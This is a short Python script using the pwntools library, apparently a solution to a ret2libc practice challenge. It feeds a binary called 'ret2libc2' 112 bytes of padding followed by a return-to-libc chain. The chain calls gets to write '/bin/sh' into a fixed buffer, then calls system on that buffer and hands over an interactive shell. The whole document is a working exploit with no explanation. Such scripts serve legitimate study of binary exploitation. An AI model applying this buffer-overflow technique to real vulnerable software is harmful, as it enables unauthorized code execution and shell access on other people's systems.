#!/usr/bin/env python
from pwn import *
p = process('./ret2libc2')
elf = ELF('./ret2libc2')
gets_plt = elf.plt['gets'] # 0x08048460
system_plt = elf.plt['system'] # 0x08048490
buf = 0x804a080
offset = 112
payload = (
	'A' * 112 + 
	p32(gets_plt) + 
	p32(system_plt) + 
	p32(buf) + 
	p32(buf)
)
# gdb.attach(p)
p.sendline(payload)
p.sendline('/bin/sh')
p.interactive()
